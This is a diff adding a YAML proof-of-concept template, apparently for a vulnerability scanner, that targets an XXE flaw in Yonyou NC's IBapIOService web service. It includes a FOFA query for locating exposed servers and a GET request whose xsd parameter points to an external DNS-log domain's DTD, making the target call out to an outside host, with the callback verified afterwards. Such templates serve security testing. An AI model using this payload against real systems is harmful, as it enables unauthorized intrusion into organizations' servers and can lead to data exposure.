@@ -1,0 +1,17 @@
+id: poc-yaml-yongyou-nc-ibapioservice-xxe
+info:
+  name: 用友NC IBapIOService XXE漏洞
+  severity: high
+  tags:
+  - DNSLOG
+  - xxe
+  finger: 用友NC
+  fofa: app="用友-UFIDA-NC"
+variables:
+  reverse: new_dns_log()
+  domain: reverse.Domain()
+requests:
+- method: GET
+  path: /uapws/service/nc.itf.bap.service.IBapIOService?xsd=http://{{.domain}}/ext.dtd
+  expression: reverse.Verify()
+transport: http
